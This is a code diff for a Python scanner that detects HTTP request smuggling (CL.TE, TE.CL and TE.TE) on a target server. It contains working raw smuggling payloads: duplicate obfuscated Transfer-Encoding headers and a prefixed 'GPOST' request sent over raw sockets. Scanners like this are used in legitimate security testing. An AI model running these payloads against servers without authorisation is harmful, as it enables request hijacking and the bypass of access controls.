@@ -1,5 +1,6 @@
 import requests
 import argparse
+import sys
 from fake_useragent import UserAgent
 import time
 import socket, ssl
@@ -19,6 +20,7 @@ class bcolors:
 class checkServer:
     agent = ''
     timeout = 7
+    loop = 10
     
     def __init__(self, args):
         self.agent = args.agent
@@ -54,9 +56,9 @@ class checkServer:
         
         if time.time() - start >= self.timeout:
             print(f'{bcolors.WARNING}[*] Server using CL.TE{bcolors.ENDC}')
-            print(f"{bcolors.FAIL}=== payload ===")
+            print(f"{bcolors.FAIL}====== payload ======")
             print(header + data, end="")
-            print(f"==============={bcolors.ENDC}")
+            print(f"======================{bcolors.ENDC}")
             return 1
         return 0
         
@@ -73,27 +75,37 @@ class checkServer:
         
         if time.time() - start >= self.timeout:
             print(f'{bcolors.WARNING}[*] Server using TE.CL{bcolors.ENDC}')
-            print(f"{bcolors.FAIL}=== payload ===")
+            print(f"{bcolors.FAIL}====== payload ======")
             print(header + data, end="")
-            print(f"==============={bcolors.ENDC}")
+            print(f"======================{bcolors.ENDC}")
             return 1
         return 0
         
     # Check server is TE.TE    
     def checkTETE(self, url, req):
-        print("[*] Testing TE.TE...")
+        for i in range(self.loop):
+            
+            print("[*] Testing TE.TE...")
+            
+            header = 'POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\r\n\r\n'.format(urlparse(url).netloc)
+            data = '5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n'
+            
+            start = time.time()
+            sendPayload(url, header, data)
+            
+            # Send one normal request to test TETE.
+            normal_header = 'POST / HTTP/1.1\r\nHost: {}'.format(urlparse(url).netloc)
+            res = requests.post(url)
+            
+            # Check if request is smuggled. 
+            if res.text.find("GPOST") != -1:
+                print(f'{bcolors.WARNING}[*] Server using TE.TE{bcolors.ENDC}')
+                print(f"{bcolors.FAIL}====== payload ======")
+                print(header + data, end="")
+                print(f"======================{bcolors.ENDC}")
+                return 1
         
-        header = 'POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\r\n\r\n'.format(urlparse(url).netloc)
-        data = '5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n'
-        
-        start = time.time()
-        sendPayload(url, header, data)
-        
-        normal_header = 'POST / HTTP/1.1\r\nHost: {}'.format(urlparse(url).netloc)
-        res = sendPayload(url, header, '')
-        
-        print(res)
-        return 1
+        return 0
 
 def banner():
 	print("""
@@ -125,7 +137,14 @@ def sendPayload(url, header, data):
     
     s.connect((parse.netloc, port))
     s.sendall(header.encode('iso-8859-1') + data.encode('ascii'))
-    return s.recv(4096)
+    
+    # If testing TETE, no recive data.
+    if sys._getframe(2).f_code.co_name.find("TETE") != -1:
+        return
+    
+    response = s.recv(50).decode('utf-8')
+    status_code = response[:response.index("\r\n")]
+    print("     └───> "+status_code)
     
 
 # Generate fake user-agent
